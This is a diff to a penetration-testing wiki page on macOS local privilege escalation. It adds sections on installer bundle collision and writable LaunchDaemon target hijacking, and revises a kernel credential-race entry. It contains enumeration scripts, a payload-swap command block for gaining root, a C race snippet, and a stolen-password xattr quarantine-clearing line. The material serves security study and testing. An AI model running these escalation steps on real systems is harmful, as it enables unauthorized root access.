@@ -242,7 +242,7 @@ printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /t
 
 The stolen password can then be reused to **clear Gatekeeper quarantine with `xattr -c`**, copy LaunchDaemons or other privileged files, and run additional stages non-interactively.<sup>[[1]](#references)</sup>
 
-## Newer macOS-specific vectors (2023–2025)
+## Newer macOS-specific vectors (2023–2026)
 
 ### Deprecated `AuthorizationExecuteWithPrivileges` still usable
 
@@ -303,41 +303,69 @@ echo 'id > /tmp/pkg-root' >> ~/.zshenv
 
 If you want a deeper dive into installer-specific abuse, also check [this page](macos-files-folders-and-binaries/macos-installers-abuse.md).
 
-### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+### Installer destination collision via `.localized`
 
-If a LaunchDaemon plist or its `ProgramArguments` target is **user-writable**, you can escalate by swapping it then forcing launchd to reload:
+Some third-party installers register a root LaunchDaemon whose executable is referenced with a fixed path inside `/Applications/Target.app`. If an attacker can create that bundle first with a **different bundle identifier**, Installer may preserve the decoy and place the real app at `/Applications/Target.localized/Target.app`. The daemon still points to the original path. Therefore, an attacker-controlled executable inside the decoy bundle can later run as root.<sup>[[8]](#references)</sup>
+
+The important preconditions are:<sup>[[8]](#references)</sup>
+
+1. The attacker can create or control the expected application path.
+2. The package does not remove the conflicting bundle.
+3. The privileged job uses a hard-coded path inside that bundle.
+4. The user or an MDM workflow installs the package and registers the job.
+
+Look for relocated bundles and then review LaunchDaemon targets with the enumeration loop in the next section:<sup>[[8]](#references)</sup>
 
 ```bash
-sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
-cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
-chmod 755 /Library/PrivilegedHelperTools/securemonitor
-cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0"><dict>
-  <key>Label</key><string>com.apple.securemonitor</string>
-  <key>ProgramArguments</key>
-  <array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
-  <key>RunAtLoad</key><true/>
-</dict></plist>
-PLIST
-sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+find /Applications -type d -name '*.localized' -prune -print
+for app in /Applications/*.app; do
+  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
+done
 ```
 
-This mirrors the exploit pattern published for **CVE-2025-24085**, where a writable plist was abused to execute attacker code as root.
+A safer installer resolves the final bundle location and keeps privileged executables in a root-owned location such as `/Library/PrivilegedHelperTools`. It should also verify ownership and code signing before registering or starting the job.<sup>[[8]](#references)</sup>
 
-### XNU SMR credential race (CVE-2025-24118)
+### Writable LaunchDaemon target hijack
 
-A **race in `kauth_cred_proc_update`** lets a local attacker corrupt the read-only credential pointer (`proc_ro.p_ucred`) by racing `setgid()`/`getgid()` loops across threads until a torn `memcpy` occurs. Successful corruption yields **uid 0** and kernel memory access. Minimal PoC structure:
+A LaunchDaemon plist may be root-owned while its `Program` or first `ProgramArguments` entry points into a user-writable directory. Check the **whole path**, not only the executable mode. If the parent directory is writable, an attacker may rename a root-owned executable and create a replacement at the same path. The replacement runs as root the next time the job starts. A reboot or a normal service restart is enough. The attacker does not need permission to run `launchctl bootstrap` in the system domain.<sup>[[7]](#references)</sup>
+
+Enumerate each target and its immediate parent first:<sup>[[7]](#references)</sup>
+
+```bash
+for p in /Library/LaunchDaemons/*.plist; do
+  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
+  [ -n "$target" ] ||
+    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
+  [ -n "$target" ] || continue
+  printf '\n%s -> %s\n' "$p" "$target"
+  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
+done
+```
+
+When the file or its parent is writable, preserve the original binary and replace the path with an executable payload. Then wait for the already-loaded daemon to restart.<sup>[[7]](#references)</sup>
+
+```bash
+target=/path/from/the/plist
+mv "$target" "$target.real"
+cp /tmp/payload "$target"
+chmod 755 "$target"
+```
+
+### XNU SMR credential-pointer race (CVE-2025-24118)
+
+The vulnerable `kauth_cred_proc_update` path updated `proc_ro.p_ucred` with the non-atomic `zalloc_ro_mut` API while SMR readers loaded the pointer without a lock. The public trigger uses a specially prepared setgid binary. One thread switches between its real and effective group IDs while another thread repeatedly enters a syscall such as `getgid()`.<sup>[[4]](#references)</sup>
 
 ```c
-// thread A
-while (1) setgid(rand());
-// thread B
-while (1) getgid();
+// Writer thread inside a setgid binary
+while (1) {
+    setgid(real_gid);
+    setgid(effective_gid);
+}
+// Reader thread
+while (1) observed_gid = getgid();
 ```
 
-Couple with heap grooming to land controlled data where the pointer re-reads. On vulnerable builds this is a reliable **local kernel privesc** without SIP bypass requirements.<sup>[[4]](#references)</sup>
+Treat this as a **race primitive**, not a ready-made root exploit. The published PoC demonstrates a torn credential pointer. It commonly ends in a kernel panic. The researcher only reproduced the corruption on Intel and did not provide deterministic control of the resulting credential object. Apple changed the update to an atomic pointer exchange in macOS 15.3.<sup>[[4]](#references)</sup>
 
 ### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)
 
@@ -372,13 +400,16 @@ This can be useful to escalate privileges:
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
 
+
+
 ## References
 
 - [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 - [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
 - [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
+- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
 - [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
 - [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
-
+- [7] [LaunchDaemon Hijacking: privilege escalation and persistence via insecure folder permissions](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
+- [8] [macOS LPE via the .localized directory](https://theevilbit.github.io/posts/localized/)
 {{#include ../../banners/hacktricks-training.md}}
